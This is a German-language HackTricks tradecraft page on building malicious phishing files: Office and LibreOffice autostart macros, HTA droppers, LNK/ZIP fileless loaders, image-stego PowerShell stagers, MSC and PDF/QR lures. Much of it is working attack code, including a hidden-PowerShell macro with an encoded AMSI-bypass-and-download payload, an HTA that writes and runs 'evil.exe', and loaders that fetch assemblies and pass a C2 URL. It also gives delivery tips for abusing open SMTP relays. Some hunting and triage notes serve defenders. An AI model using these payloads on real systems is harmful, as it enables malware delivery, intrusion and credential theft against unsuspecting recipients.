# Phishing-Dateien & -Dokumente

{{#include ../../banners/hacktricks-training.md}}

## Office-Dokumente

Microsoft Word führt vor dem Öffnen einer Datei eine Validierung der Dateidaten durch. Die Validierung erfolgt durch Identifizierung der Datenstruktur anhand des OfficeOpenXML-Standards. Tritt bei der Identifizierung der Datenstruktur ein Fehler auf, wird die analysierte Datei nicht geöffnet.

Üblicherweise verwenden Word-Dateien mit Makros die Erweiterung `.docm`. Es ist jedoch möglich, die Dateierweiterung zu ändern und die Makrofunktionen trotzdem beizubehalten.\
Eine RTF-Datei unterstützt beispielsweise konstruktionsbedingt keine Makros. Eine in RTF umbenannte DOCM-Datei wird jedoch von Microsoft Word verarbeitet und kann Makros ausführen.\
Dieselben Interna und Mechanismen gelten für alle Programme der Microsoft Office Suite (Excel, PowerPoint usw.).

Mit dem folgenden Befehl kannst du prüfen, welche Erweiterungen von einigen Office-Programmen ausgeführt werden:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX-Dateien, die auf eine Remote-Vorlage verweisen (Datei – Optionen – Add-Ins – Verwalten: Vorlagen – Gehe zu), die Makros enthält, können ebenfalls Makros „ausführen“.

### Externes Bild laden

Gehe zu: _Einfügen --> Schnellbausteine --> Feld_\
_**Kategorien**: Links und Verweise, **Feldnamen**: includePicture und **Dateiname oder URL**:_ http://<ip>/whatever

![Office-Dokumente – Externes Bild laden: Gehe zu: Einfügen -- Schnellbausteine -- Feld](<../../images/image (155).png>)

Informationen zur Analyse eines empfangenen Dokuments statt zum Erstellen eines Dokuments findest du unter [VBA-Makroanalyse: Junk-Code und UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms).

### Makro-Backdoor

Mit Makros lässt sich beliebiger Code aus dem Dokument ausführen.

#### Autoload-Funktionen

Je häufiger sie vorkommen, desto wahrscheinlicher ist es, dass AV sie erkennt.

- AutoOpen()
- Document_Open()

#### Makro-Codebeispiele

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Metadaten manuell entfernen

Gehe zu **Datei > Informationen > Dokument überprüfen > Dokument überprüfen**, um den Dokumentinspektor zu öffnen. Klicke auf **Überprüfen** und dann neben **Dokumenteigenschaften und persönliche Informationen** auf **Alle entfernen**.

#### DOC-Erweiterung

Wähle nach Abschluss im Dropdown-Menü **Dateityp** die Option **Word 97–2003 `.doc`** statt **`.docx`** aus.\
Das ist nötig, weil du **Makros nicht in einer `.docx` speichern kannst** und die makrofähige Erweiterung **`.docm`** einen **schlechten Ruf** hat (z. B. zeigt das Miniaturbild ein großes `!`, und manche Web-/E-Mail-Gateways blockieren solche Dateien vollständig). Daher ist die **ältere `.doc`-Erweiterung der beste Kompromiss**.

#### Generatoren für bösartige Makros

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice-ODT-Autostart-Makros (Basic)

LibreOffice-Writer-Dokumente können Basic-Makros einbetten und diese beim Öffnen der Datei automatisch ausführen, indem das Makro an das Ereignis **Dokument öffnen** gebunden wird (Extras → Anpassen → Ereignisse → Dokument öffnen → Makro…).<sup>[[1]](#references)</sup> Ein einfaches Reverse-Shell-Makro sieht so aus:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Beachte die doppelten Anführungszeichen (`""`) innerhalb der Zeichenfolge – LibreOffice Basic verwendet sie, um Anführungszeichen als Literalzeichen zu maskieren. Daher bleiben bei Payloads, die mit `...==""")` enden, sowohl der innere Befehl als auch das Shell-Argument korrekt geschlossen.

Tipps zur Zustellung:

- Speichere die Datei als `.odt` und weise das Makro dem Dokumentereignis zu, damit es sofort beim Öffnen ausgeführt wird.
- Verwende beim E-Mail-Versand mit `swaks` `--attach @resume.odt` (das `@` ist erforderlich, damit die Dateibytes und nicht die Zeichenfolge des Dateinamens als Anhang gesendet werden). Das ist entscheidend, wenn SMTP-Server missbraucht werden, die beliebige `RCPT TO`-Empfänger ohne Validierung akzeptieren.

## HTA-Dateien

Eine HTA ist ein Windows-Programm, das **HTML und Skriptsprachen (wie VBScript und JScript) kombiniert**. Es erzeugt die Benutzeroberfläche und wird als Anwendung mit „voller Vertrauenswürdigkeit“ ausgeführt, ohne den Einschränkungen des Sicherheitsmodells eines Browsers zu unterliegen.

Eine HTA wird mit **`mshta.exe`** ausgeführt, das normalerweise zusammen mit **Internet Explorer** **installiert** wird. Daher ist `mshta` von IE abhängig. Wurde IE deinstalliert, können HTAs also nicht mehr ausgeführt werden.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Gefälschte Anhangskarten in HTML-E-Mails

Eine HTML-E-Mail kann die native Vorschaukarte eines Anhangs bei einem Anbieter nachahmen, ohne einen echten Anhang mitzuführen. Talos beobachtete eine Gmail-Karte, die aus vier Base64-kodierten Inline-PNG-MIME-Teilen zusammengesetzt war. Die gesamte visuelle Darstellung war in einem einzigen Anchor-Element eingeschlossen, und ein Empfängerwert in `?m=<target-id>` ermöglichte das Tracking einzelner Empfänger. Der Link begann mit `//` statt mit `http://` oder `https://`; Browser lösen diese protokollrelative Form auf, aber URL-Extraktoren, die nur vollständig qualifizierte URLs erkennen, können sie übersehen.<sup>[[11]](#references)</sup>

Untersuchen Sie bei der Analyse das rohe MIME, statt der gerenderten Anhangsliste zu vertrauen. Rekonstruieren Sie, wie die Inline-Bildteile die visuelle Karte bilden, identifizieren Sie das umschließende Anchor-Element und normalisieren Sie protokollrelative `href`-Werte, bevor Sie URLs extrahieren.<sup>[[11]](#references)</sup>

Informationen zum Spoofing von Envelope-/Header-Absendern und zum Testen der DMARC-Ausrichtung finden Sie unter [Gegenmaßnahmen gegen SMTP-Mail-Spoofing](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## NTLM-Authentifizierung erzwingen

Es gibt mehrere Möglichkeiten, **NTLM-Authentifizierung „remote“ zu erzwingen**. Sie könnten beispielsweise **unsichtbare Bilder** in E-Mails oder HTML einfügen, auf das der Benutzer zugreifen wird (sogar über HTTP MitM?). Oder Sie senden dem Opfer die **Adresse von Dateien**, die bereits beim **Öffnen des Ordners** eine **Authentifizierung** **auslösen**.

**Weitere Ideen finden Sie auf den folgenden Seiten:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Vergessen Sie nicht, dass Sie nicht nur den Hash oder die Authentifizierung stehlen, sondern auch **NTLM-Relay-Angriffe ausführen** können:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM-Relay zu Zertifikaten)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK-Loader + in ZIP eingebettete Payloads (dateilose Kette)

Hochwirksame Kampagnen liefern eine ZIP-Datei mit zwei legitimen Ablenkungsdokumenten (PDF/DOCX) und einer bösartigen .lnk-Datei. Der Trick besteht darin, dass der eigentliche PowerShell-Loader nach einem eindeutigen Marker in den Rohbytes der ZIP-Datei gespeichert ist und die .lnk-Datei ihn extrahiert und vollständig im Arbeitsspeicher ausführt.<sup>[[2]](#references)</sup>

Typischer Ablauf eines PowerShell-Einzeilers in der .lnk-Datei:

1) Die ursprüngliche ZIP-Datei an üblichen Speicherorten suchen: Desktop, Downloads, Dokumente, %TEMP%, %ProgramData% und im übergeordneten Verzeichnis des aktuellen Arbeitsverzeichnisses.
2) Die ZIP-Bytes lesen und nach einem fest kodierten Marker suchen (z. B. xFIQCV). Alles nach dem Marker ist die eingebettete PowerShell-Payload.
3) Die ZIP-Datei nach %ProgramData% kopieren, dort entpacken und das Ablenkungsdokument .docx öffnen, um einen legitimen Eindruck zu erwecken.
4) AMSI für den aktuellen Prozess umgehen: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Die nächste Stufe deobfuskieren (z. B. alle #-Zeichen entfernen) und im Arbeitsspeicher ausführen.

Beispiel für ein PowerShell-Grundgerüst zum Extrahieren und Ausführen der eingebetteten Stufe:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Hinweise
- Die Zustellung missbraucht häufig seriöse PaaS-Subdomains (z. B. *.herokuapp.com) und kann Payloads nur unter bestimmten Bedingungen ausliefern (etwa harmlose ZIPs abhängig von IP/UA).
- Die nächste Stufe entschlüsselt häufig Base64-/XOR-Shellcode und führt ihn über Reflection.Emit + VirtualAlloc aus, um Spuren auf der Festplatte zu minimieren.

Persistenz innerhalb derselben Chain
- COM-TypeLib-Hijacking des Microsoft-Web-Browser-Steuerelements, sodass IE/Explorer oder jede App, die es einbettet, die Payload automatisch erneut startet.<sup>[[2]](#references)[[4]](#references)</sup> Details und direkt nutzbare Befehle finden Sie hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP-Dateien, die die ASCII-Markierungszeichenfolge (z. B. xFIQCV) an die Archivdaten angehängt enthalten.
- Eine .lnk-Datei, die übergeordnete Ordner und Benutzerordner durchsucht, um das ZIP zu finden, und ein Köderdokument öffnet.
- AMSI-Manipulation über [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Lange geschäftliche E-Mail-Threads, die mit Links auf vertrauenswürdigen PaaS-Domains enden.

## LNK-Staging mit Köderdokument zuerst → Persistenz über geplante Aufgabe → Side-Loading einer vertrauenswürdigen CPL

Ein weiteres wiederkehrendes Muster ist eine **dokumentgetarnte `.lnk`-Datei**, die sofort einen harmlosen Köder öffnet, während sie im Hintergrund die echte Chain vorbereitet.<sup>[[3]](#references)</sup>

Beobachteter Ablauf:
1. Die Verknüpfung **tarnt sich als PDF** und verwendet `conhost.exe` oder einen ähnlichen Proxy, um einen verschleierten PowerShell-Downloader zu starten.
2. PowerShell zerlegt offensichtliche Tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), sodass naive Erkennungen, die nach `iwr`, `gci`, `ren`, `cpi` oder `schtasks` suchen, den Befehl übersehen.
3. Der Stager lädt **zuerst das Köderdokument** herunter und öffnet es für das Opfer; anschließend rekonstruiert er die schädlichen Dateien im Hintergrund.
4. Payloads können mit **irreführenden Erweiterungen** geschrieben und anschließend durch Entfernen von Füllzeichen umbenannt werden. Dadurch erscheinen offensichtliche `.exe`-/.cpl-Artefakte erst später.
5. Die Persistenz wird über eine **minutenbasierte geplante Aufgabe** eingerichtet, die eine vertrauenswürdige Host-Binärdatei aus einem benutzerbeschreibbaren Pfad startet.

Minimale Hunting-Hinweise zu diesem Muster:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Ein nützliches Staging-Layout, das man erkennen sollte:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` or `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Warum die zweite Stufe unauffällig ist

In der Rapid7-Fallstudie startete der Scheduled Task wiederholt **`Fondue.exe`** aus `C:\Users\Public\`. Da **`APPWIZ.cpl`** daneben abgelegt war und **`RunFODW`** exportierte, lud die vertrauenswürdige Microsoft-Binärdatei die Angreifer-CPL per DLL side-loading statt der legitimen Systemkopie.

Die CPL:
- Liest einen **AES-256-CBC**-Blob aus `C:\Windows\Tasks\editor.dat`
- Entschlüsselt ihn über **Windows CNG / `bcrypt.dll`**
- Allokiert ausführbaren Speicher und kopiert den entschlüsselten Shellcode hinein
- Führt ihn indirekt aus, indem sie den Shellcode-Zeiger als Callback für **`EnumUILanguagesW`** übergibt

Dieser letzte Schritt ist eine separate Suche wert: Malware vermeidet oft einen direkten Sprung wie `((void(*)())buf)()` und missbraucht stattdessen eine **legitime WinAPI, die einen Callback entgegennimmt**, um die Ausführung zu übertragen.

Die entschlüsselte Payload in dieser Kampagne war **Donut**-Shellcode, der anschließend die finale PE vollständig im Speicher abbildete und **AMSI/WLDP/ETW** im aktuellen Prozess patchte, bevor er die Ausführung übergab. Ausführlichere Hinweise zu DLL side-loading und im Speicher residenter Nachbearbeitung finden sich hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktische Suchansätze:
- `.lnk`, die `powershell.exe` oder `conhost.exe` starten, gefolgt von einem sichtbaren Köderdokument.
- Kurzlebige Downloads nach **`C:\Users\Public\`**, gefolgt von sofortigen Umbenennungen von Dateien mit unsinnigen Erweiterungen.
- Scheduled Tasks mit unauffälligen Namen wie `GoogleErrorReport`, die Dateien aus **benutzerbeschreibbaren Verzeichnissen** ausführen.
- Vertrauenswürdige Binärdateien, die **`.cpl` / `.dll`**-Dateien aus demselben Nicht-Systemverzeichnis laden.
- Base64-Textblobs, die unter **`C:\Windows\Tasks\`** geschrieben und anschließend vom per DLL side-loading geladenen Modul gelesen werden.

## Durch Steganografie abgegrenzte Payloads in Bildern (PowerShell-Stager)

Neuere Loader-Ketten liefern ein verschleiertes JavaScript/VBS aus, das einen Base64-PowerShell-Stager dekodiert und ausführt. Dieser Stager lädt ein Bild herunter (oft GIF), das eine Base64-kodierte .NET-DLL als Klartext zwischen eindeutigen Start-/Endmarkierungen verbirgt. Das Skript sucht nach diesen Begrenzern (in freier Wildbahn beobachtete Beispiele: «<<sudo_png>> … <<sudo_odt>>>»), extrahiert den Text dazwischen, dekodiert ihn mit Base64 zu Bytes, lädt die Assembly in den Speicher und ruft eine bekannte Einstiegsmethode mit der C2-URL auf.<sup>[[5]](#references)</sup>

Arbeitsablauf
- Stufe 1: Archivierter JS/VBS-Dropper → dekodiert eingebettetes Base64 → startet den PowerShell-Stager mit -nop -w hidden -ep bypass.
- Stufe 2: PowerShell-Stager → lädt das Bild herunter, extrahiert das durch Markierungen abgegrenzte Base64, lädt die .NET-DLL in den Speicher und ruft ihre Methode (z. B. VAI) mit der C2-URL und Optionen auf.
- Stufe 3: Der Loader ruft die finale Payload ab und injiziert sie typischerweise per Process Hollowing in eine vertrauenswürdige Binärdatei (häufig MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Mehr über Process Hollowing und die Ausführung über vertrauenswürdige Hilfsprogramme erfahren Sie hier:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell-Beispiel zum Extrahieren einer DLL aus einem Bild und Aufrufen einer .NET-Methode im Speicher:

<details>
<summary>PowerShell-Extractor und -Loader für Stego-Payloads</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Hinweise
- Dies ist ATT&CK T1027.003 (Steganografie/Marker-Verstecken).<sup>[[6]](#references)</sup> Die Marker unterscheiden sich je nach Kampagne.
- AMSI/ETW-Umgehung und String-Deobfuskierung werden häufig vor dem Laden der Assembly angewendet.
- Hunting: Heruntergeladene Bilder auf bekannte Trennzeichen scannen; PowerShell-Prozesse identifizieren, die auf Bilder zugreifen und unmittelbar Base64-Blobs decodieren.

Siehe auch Stego-Tools und Carving-Techniken:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS-Dropper → Base64-PowerShell-Staging

Eine wiederkehrende Initial-Stage ist eine kleine, stark verschleierte `.js`- oder `.vbs`-Datei, die in einem Archiv ausgeliefert wird. Ihr einziger Zweck ist es, einen eingebetteten Base64-String zu decodieren und PowerShell mit `-nop -w hidden -ep bypass` zu starten, um die nächste Stage über HTTPS zu laden.<sup>[[5]](#references)</sup>

Skelettlogik (abstrakt):
- Eigenen Dateiinhalt lesen
- Einen Base64-Blob zwischen Tarnstrings finden
- In ASCII-PowerShell decodieren
- Mit `wscript.exe`/`cscript.exe` `powershell.exe` aufrufen und ausführen

Hunting-Hinweise
- Archivierte JS/VBS-Anhänge, die `powershell.exe` mit `-enc`/`FromBase64String` in der Befehlszeile starten.
- `wscript.exe`, das `powershell.exe -nop -w hidden` aus Benutzer-Temp-Pfaden startet.

## MSC-Dokumente als Ausführungscontainer (GrimResource)

Microsoft Management Console-Dateien (`.msc`) sind XML-Konsolendefinitionen, die normalerweise mit `mmc.exe` geöffnet werden. **GrimResource** missbraucht eine `StringTable`-Referenz auf eine `apds.dll`-Ressource mit einer alten XSS-Primitive, sodass beim Öffnen der präparierten Konsole durch einen Benutzer JavaScript innerhalb von `mmc.exe` ausgeführt wird. Beobachtete Samples kombinierten `transformNode`-basierte Verschleierung mit **DotNetToJScript**, um eine .NET-Payload ohne den üblichen Office-Makro-Pfad zu instanziieren.<sup>[[9]](#references)</sup>

Bei der statischen Triage eine nicht vertrauenswürdige MSC-Datei als Text behandeln und **nicht** doppelklicken:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Runtime-Indikatoren mit hoher Aussagekraft sind, wenn `mmc.exe` die CLR- oder Skriptkomponenten lädt, Netzwerkverbindungen herstellt oder `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` oder eine unerwartete ausführbare Datei startet. Das Format ist legitim. Daher sollten Erkennungen **Herkunft + verdächtiger XML-/Skriptinhalt + Verhalten von `mmc.exe`** korrelieren, statt jede MSC-Datei zu blockieren.<sup>[[9]](#references)</sup>

## PDF-/QR-Weiterleitungen und Payload-Steuerung

Ein PDF muss keinen Exploit enthalten, um nützlich zu sein. In aktuellen Kampagnen platzieren Angreifer einen **QR-Code oder gewöhnlichen Link** in einem harmlos wirkenden Dokument, leiten die Browser-Sitzung an den E-Mail-Kontrollen vorbei und personalisieren das Ziel mit der Empfängeradresse. Microsoft dokumentierte 2025 PDFs, deren QR-URLs pro Empfänger einzigartig waren und zu einer RaccoonO365-Infrastruktur zum Abgreifen von Zugangsdaten führten. Eine parallele Angriffskette nutzte IP-/Umgebungsprüfungen, um ausgewählten Besuchern einen JavaScript-/MSI-Pfad, Scannern oder nicht zugelassenen Clients hingegen ein harmloses PDF bereitzustellen.<sup>[[10]](#references)</sup>

Prüfe sowohl PDF-Aktionen als auch gerenderte QR-Codes. Ein QR-Code kann als Vektorgrafik gezeichnet sein, statt als extrahierbares Bild gespeichert zu werden. Wandle daher jede Seite in ein Rasterbild um und extrahiere zusätzlich eingebettete Bilder:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Untersuchen Sie dekodierte Ziele und Weiterleitungen von einem isolierten Analysesystem aus, ohne sich zu authentifizieren. Nützliche Suchmerkmale sind PDFs, die ausschließlich QR-Codes enthalten, bei nahezu leeren E-Mail-Texten versendet werden, die E-Mail-Adresse des Empfängers in einem Abfrageparameter enthalten, mehrere Weiterleitungen über seriöse Hosting-Dienste durchlaufen und je nach IP-Adresse, Geolokalisierung, Cookies, Referrer oder User-Agent unterschiedliche Inhalte zurückgeben. Vergleichen Sie Anfragen mit kontrollierten Profilen, da ein einzelner Abruf durch eine Sandbox möglicherweise nur die Täuschungsseite erhält.<sup>[[10]](#references)</sup>

## Windows-Dateien zum Stehlen von NTLM-Hashes

Lesen Sie die Seite über **Orte zum Stehlen von NTLM-Anmeldedaten**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice-Makro → IIS-Webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine-Kampagne: Eine ausgeklügelte Phishing-Kampagne gegen US-Unternehmen](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Verfolgung der Tradecraft von Dropping Elephant entlang einer China-Themed Loader-Kette](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [TypeLib kapern – Neue COM-Persistenztechnik (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader liefert eine Reihe von Infostealern](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganografie (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console für den Erstzugriff und die Umgehung von Abwehrmaßnahmen](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Angreifer nutzen die Steuersaison für steuerbezogene Phishing-Kampagnen](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – UAT-11587-Auslieferungskette und Antino-Backdoor](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
{{#include ../../banners/hacktricks-training.md}}
